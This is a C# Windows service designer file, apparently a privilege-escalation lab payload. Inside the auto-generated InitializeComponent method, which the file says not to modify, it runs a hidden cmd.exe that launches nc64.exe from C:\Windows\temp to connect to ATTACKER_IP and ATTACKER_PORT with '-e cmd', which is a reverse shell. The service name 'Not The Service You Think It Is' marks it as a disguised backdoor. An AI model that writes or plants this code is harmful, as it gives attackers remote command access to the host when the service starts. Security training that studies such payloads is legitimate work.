﻿namespace SimpleWindowsService1
{
    partial class SimpleService
    {
        /// <summary> 
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Component Designer generated code

        /// <summary> 
        /// Required method for Designer support - do not modify 
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.eventLogSimple = new System.Diagnostics.EventLog();
            ((System.ComponentModel.ISupportInitialize)(this.eventLogSimple)).BeginInit();
            // 
            // SimpleService
            // 
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C \"C:\\Windows\\temp\\nc64.exe ATTACKER_IP ATTACKER_PORT -e cmd\"";
            process.StartInfo = startInfo;
            process.Start();

            this.ServiceName = "Not The Service You Think It Is";
            ((System.ComponentModel.ISupportInitialize)(this.eventLogSimple)).EndInit();

        }

        #endregion

        private System.Diagnostics.EventLog eventLogSimple;
    }
}
